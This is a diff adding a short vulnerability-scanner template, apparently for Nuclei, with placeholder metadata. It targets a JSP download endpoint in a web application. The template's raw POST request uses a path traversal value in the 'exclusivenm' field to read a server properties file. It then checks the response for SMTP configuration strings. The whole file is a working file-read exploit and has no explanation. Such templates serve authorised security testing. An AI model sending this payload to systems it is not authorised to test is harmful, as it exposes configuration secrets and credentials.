@@ -1,0 +1,31 @@
+id: yysk-downnewsatt
+
+info:
+  name: '111'
+  author: '111'
+  severity: critical
+http:
+  - raw:
+      - |-
+        POST /newspublish/downnewsatt.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
+
+        exclusivenm=../../WEB-INF/classes/shikong.properties
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - debug=false
+      - type: word
+        part: body
+        words:
+          - smtpserver
+    
+    matchers-condition: and
